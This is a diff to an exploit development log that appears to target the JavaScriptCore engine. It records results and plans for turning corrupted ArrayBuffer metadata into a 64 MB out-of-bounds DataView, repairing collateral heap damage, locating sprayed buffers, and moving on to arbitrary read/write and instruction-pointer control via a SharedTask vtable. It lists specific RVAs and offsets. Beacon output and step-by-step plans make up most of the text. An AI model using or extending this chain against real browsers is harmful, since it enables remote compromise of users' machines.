@@ -561,12 +561,22 @@ boundary between two unrelated uint32 fields (0x00000000 followed by 0x00000001 
 per JSArrayBufferPrototype.cpp:257.** The fact that it returns 256 proves
 m_impl points to an UNEXPANDED native ArrayBuffer — one we never shot.
 
-### V48 Plan: Fresh DataView → Find Real m_impl → Expand → OOB
+### V48 Result: OOB READ/WRITE CONFIRMED
 
-Create a FRESH DataView on sprayBuf this session. The engine resolves sprayBuf's
-m_impl when creating it. Find the fresh cell via CSCAN (byteOffset=0 distinguishes
-it from the spray's original views at byteOffset=0x20). Read fresh_cell+0x30
-→ the REAL m_impl. If different from A → expand it → construction ladder.
+```
+V48-SAME=false                             H1: DRIFT CONFIRMED
+V48-FRESH-MBUF=0x100088e5e0              The REAL impl (different from stale A)
+V48-REAL-NEW-SIZE=0x100000000000100       Real impl expanded to 72 PB
+V48-JS-BL-POST=72057594037928200         JS NOW SEES THE EXPANDED SIZE
+V48-OOB-RW-CONFIRMED-size=0x1000         4KB OOB READ/WRITE FROM JS
+```
+
+The drift hypothesis was correct. V48 found the real authority AB via a fresh
+DataView cell scan, expanded it, and achieved OOB read/write from JavaScript.
+The 4096-byte DataView reads/writes past the 256-byte buffer into adjacent
+Gigacage allocations.
+
+**Next: V49 — 64MB expansion + Gigacage ARW bootstrap.**
 
 ---
 
@@ -642,3 +652,41 @@ Notes for V49:
   singleton), REPAIR the corrupted destructor MSBs (stale A + real impl) from
   the view, then bootstrap: rewrite every other spray buffer's m_sizeInBytes
   from the view itself -> full-cage R/W -> RIP work (SharedTask run() chain).
+
+### V49 Result: THE 64MB OOB VIEW + FULL REPAIR + FLEET DISCOVERY
+
+Beacons (session 02:16):
+
+```
+V49-OOB-DV-OK-size=0x4000000             <- a 64 MB DataView CONSTRUCTED
+V49-OOB-RW-CONFIRMED-size=0x4000000       <- OOB read/write confirmed at 64 MB scale
+V49-OOB-BASE=0x10002f0400  V49-OOB-END=0x10042f0400   <- the view window
+V49-STALE-DTOR-MSB=0xf  -> V49-STALE-DTOR-REPAIRED
+V49-STALE-SIZE-MSB=0x1  -> V49-STALE-SIZE-REPAIRED    <- stale A fully restored
+V49-REAL-DTOR-MSB=0xf   -> V49-REAL-DTOR-REPAIRED     <- live impl dtor fixed
+V49-AB-SCAN-found=10    <- 10 more spray AB objects located THROUGH the view:
+   0x100088e0a0/f160/f1c0/f220/f2e0/f340/f400/f460/f4c0/f580
+   (m_data 0x10002f2100..f2b00, f0800; all m_sizeInBytes=0x100)
+V49-JS-BL-FINAL=72057594037928200        <- consistent end state
+```
+
+What V49 achieved:
+1. THE VIEW AT SCALE: 64 MB OOB DataView over the cage, R/W verified.
+2. SELF-REPAIR: every collateral byte from the entire V42-V48 shot history
+   (stale A: dtor MSB + size MSB; real impl: dtor MSB) repaired from JS via
+   the view - the corrupted state is now clean except the ONE intentional
+   byte (the live impl's m_sizeInBytes MSB, the expansion itself).
+3. FLEET DISCOVERY: 10 further native ArrayBuffer objects found in-range,
+   each at a known view offset with m_sizeInBytes=0x100 - ready for
+   expansion DIRECTLY FROM THE VIEW (no more COOP shots needed for them:
+   just write their m_sizeInBytes MSB via the view).
+4. Module addresses (e.g. the SharedTask vptr at 0x8xxxxxxx) sit BELOW the
+   view base (negative offsets) - module reads remain via the oracle;
+   in-cage targets are fully covered.
+
+V50 plan: expand the fleet from the view (write each AB's m_sizeInBytes),
+construct 64MB views over each -> full-cage coverage in both directions;
+then aim views at the JSC cell region (m_vector rewrites on fresh DataViews
+= absolute arbitrary R/W), then RIP work: the SharedTask singleton (vtable
+RVA 0x715A200, run() RVA 0x4C31760) with its heap-resident functor payload,
+called with a pointer we control - CFI-clean by construction.
